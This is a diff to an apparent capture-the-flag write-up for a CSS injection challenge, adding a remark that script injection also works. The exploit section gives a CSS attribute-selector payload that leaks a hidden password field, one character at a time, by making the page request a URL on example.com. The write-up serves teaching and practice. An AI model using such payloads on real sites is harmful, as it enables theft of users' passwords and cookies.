@@ -19,7 +19,7 @@ Wow that's a pretty color! Don't you think? Pick your favourite and show it to t
 
 ## Exploit
 
-This is a CSS injection challenge. In the page you open, you can see that there is an input box where you can enter a color, which gets applied as you click on submit. There's also a hidden field `password`, the value of which is taken from the cookie. Since the string is interpolated, you can do something like `blue}; input[type="password"][value^="c"] {background-image: url('https://example.com?c');`, which will send a request to `example.com?c`, if the first character of the password is `c`.
+This is a CSS injection challenge (of course you can do `<<script >>` but the intended solution is CSS injection). In the page you open, you can see that there is an input box where you can enter a color, which gets applied as you click on submit. There's also a hidden field `password`, the value of which is taken from the cookie. Since the string is interpolated, you can do something like `blue}; input[type="password"][value^="c"] {background-image: url('https://example.com?c');`, which will send a request to `example.com?c`, if the first character of the password is `c`.
 <br />
 
 You may pass a long list of such CSS selectors, for all letters, for example. For example:
